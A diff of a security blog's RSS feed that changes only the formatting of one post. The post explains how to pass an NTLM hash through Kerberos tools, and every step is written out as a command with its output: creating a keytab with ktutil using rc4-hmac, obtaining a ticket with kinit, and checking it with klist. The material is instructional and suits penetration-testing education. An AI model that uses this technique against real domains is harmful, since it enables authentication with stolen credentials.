@@ -16,40 +16,23 @@
       <pubDate>Tue, 24 Jul 2018 08:30:44 -0500</pubDate>
       
       <guid>https://malicious.link/post/2018/pass-the-hash-with-kerberos/</guid>
-      <description>&lt;p&gt;This blog post may be of limited use, most of the time, when you have an NTLM hash, you also have the tools to use it. But, if you find yourself in a situation where you don&amp;rsquo;t have the tools and do happen to have kerberos tools, you can pass the hash with it.&lt;/p&gt;
-
+      <description>&lt;p&gt;This blog post may be of limited use, most of the time, when you have an NTLM hash, you also have the tools to use it. But, if you find yourself in a situation where you don&#39;t have the tools and do happen to have kerberos tools, you can pass the hash with it.&lt;/p&gt;
 &lt;p&gt;Lets say with have the NTLM hash for the user &lt;code&gt;uberuser&lt;/code&gt; and the hash is &lt;code&gt;88e4d9fabaecf3dec18dd80905521b29&lt;/code&gt;. The first step to do so is to create a keytab file using &lt;code&gt;ktutil&lt;/code&gt;:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;root@wpad:~# ktutil
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;At the &lt;code&gt;ktutil&lt;/code&gt; prompt, type in the &amp;ldquo;add entry&amp;rdquo; (&lt;code&gt;addent&lt;/code&gt;) command with the &amp;ldquo;principals&amp;rdquo; (&lt;code&gt;-p&lt;/code&gt;) flag. Specify the user and an all uppercase version of the FQDN. Then the &amp;ldquo;KVNO&amp;rdquo; (&lt;code&gt;-k 1&lt;/code&gt;), which is the key number. Finally the encryption type, which is &lt;code&gt;rc4-hmac&lt;/code&gt; for NTLM hashes:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At the &lt;code&gt;ktutil&lt;/code&gt; prompt, type in the &amp;ldquo;add entry&amp;rdquo; (&lt;code&gt;addent&lt;/code&gt;) command with the &amp;ldquo;principals&amp;rdquo; (&lt;code&gt;-p&lt;/code&gt;) flag. Specify the user and an all uppercase version of the FQDN. Then the &amp;ldquo;KVNO&amp;rdquo; (&lt;code&gt;-k 1&lt;/code&gt;), which is the key number. Finally the encryption type, which is &lt;code&gt;rc4-hmac&lt;/code&gt; for NTLM hashes:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;ktutil: addent -p uberuser@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;After you hit enter you&amp;rsquo;ll get prompted for the rc4-hmac (NTLM) hash:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After you hit enter you&#39;ll get prompted for the rc4-hmac (NTLM) hash:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Key for uberuser@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Then we write the keytab file to disk and exit &lt;code&gt;ktutil&lt;/code&gt;&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then we write the keytab file to disk and exit &lt;code&gt;ktutil&lt;/code&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;ktutil: wkt /tmp/a.keytab
 ktutil: exit
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The last step before we can use our authentication is to create a kerberos ticket using our keytab file.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The last step before we can use our authentication is to create a kerberos ticket using our keytab file.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root@wpad:~# kinit -V -k -t /tmp/a.keytab -f uberuser@CORP.SOMEWHATREALNEWS.COM
 Using default cache: /tmp/krb5cc_0
 Using principal: uberuser@CORP.SOMEWHATREALNEWS.COM
 Using keytab: /tmp/a.keytab
 Authenticated to Kerberos v5
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Validate it with &lt;code&gt;klist&lt;/code&gt;:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Validate it with &lt;code&gt;klist&lt;/code&gt;:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root@wpad:~# klist
 Ticket cache: FILE:/tmp/krb5cc_0
 Default principal: uberuser@CORP.SOMEWHATREALNEWS.COM
@@ -58,8 +41,7 @@ Valid starting       Expires              Service principal
 07/22/2018 21:38:43  07/23/2018 07:38:43  krbtgt/CORP.SOMEWHATREALNEWS.COM@CORP.SOMEWHATREALNEWS.COM
 	renew until 07/23/2018 21:38:40
 
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
   </channel>
